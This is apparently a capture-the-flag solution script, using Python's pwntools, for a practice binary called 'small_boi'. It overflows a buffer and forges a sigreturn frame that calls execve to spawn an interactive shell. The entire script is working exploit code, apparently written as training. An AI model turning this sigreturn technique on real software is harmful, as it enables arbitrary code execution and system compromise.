
from pwn import *

#binary info
context.binary = './small_boi'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
#funcion para correr el binario
def start():
    if args.GDB:
        return gdb.debug('./small_boi')

    else:
        return process('./small_boi')

sigret = p64(0x40017c) #sig return address

frame = SigreturnFrame() #sigreturn funcion de pwntools
frame.rip = 0x400185
frame.rax = 0x3b
frame.rdi = 0x4001ca
frame.rsi = 0x00
frame.rdx = 0x00


payload = "A" * 40
payload += sigret
payload += str(frame)[8:]

r = start()
r.sendline(payload)
r.interactive()